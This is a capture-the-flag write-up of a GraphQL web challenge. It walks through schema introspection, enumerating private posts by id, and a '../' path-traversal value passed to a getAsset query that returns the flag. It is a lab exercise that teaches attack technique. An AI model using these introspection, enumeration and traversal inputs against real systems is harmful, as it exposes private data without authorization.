# Maze Graph

Category: web

Points: 100

Solved by: drw0if

## Problem

Now R-Boy can start his chase. He lands in 1230 BC during the reign of Ramses II. In the Valley of the Temples, Zer0 has plundered Nefertiti’s tomb to resell the precious treasures on the black market. By accident, the guards catch R-Boy near the tomb. To prove he’s not a thief, he has to show his devotion to the Pharaoh by finding a secret note.

## Writeup

We are provided with the url `gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/`, the corresponding page said that a `/graphql` url was present on the domain, so we went there.

What we found was a [graphiql](https://github.com/graphql/graphiql) instance so definitely we must face a graphql challenge.

Graphql is an `open-source data query and manipulation language for APIs` so it is possible to retrieve and store data in a much easier way then writing and using REST policy.

Thanks to graphiql we can discover easily the requests we can make, so we don't need to find out ourselves. In particular the following query were available:

Request | Meaning
--- | ---
allPublicPosts -> [Post] | retrieves data from the post marked as public
allUsers -> [User] | retrieves data from all the users
me -> User | retrieves the current user data
post(id: int) -> Post | retrieves data from the speciefied post
user(id: int) -> User | retrieves data from the specified user
getAsset(name: String) -> String | retrieves a string from the the specified name


There were also some user-defined objects with the following structure:

```
{
  "name": "RootQuery",
  "kind": "OBJECT",
  "fields": ["me", "allUsers", "user", "post", "allPublicPosts", "getAsset"]
}
{
  "name": "User",
  "kind": "OBJECT",
  "fields": ["id", "username", "firstName", "lastName", "posts"]
}
{
  "name": "Post",
  "kind": "OBJECT",
  "fields": ["id", "title", "content", "public", "author]
}
```

This could be found using the following `__schema` query:
```
{
  __schema {
    types {
      name
      kind
      fields {
        name
      }
    }
  }
}
```

We firstly looped through all the public posts but nothing important was there. We then queried all the users and for each of them we retrieved their posts:
```
{
allUsers{
  id
  username
  firstName
  lastName
  posts{
    id
    content
  }
}}
```
and again nothing important was there.

We then moved on to the `post(id)` query; we didn't know the id range but it was for sure an incremental numeration. So we decided to enumerate all the posts starting from 1 and for each of them we printed only the private one and only the ones whose content didn't started with "uselesess". With this enumeration we found a post with `id = 40` with the content:

```
{
  "data": {
    "post": {
      "id": "40",
      "title": "Personal notes",
      "content": "Remember to delete the ../mysecretmemofile asset.",
      "public": false
    }
  }
}
```

We knew we were near the end, so we used the getAsset API:
```
{
  getAsset(name: "../mysecretmemofile")
}
```

And we got the flag:
```
{
  "data": {
    "getAsset": "{FLG:st4rt0ffwith4b4ng!}\n"
  }
}
```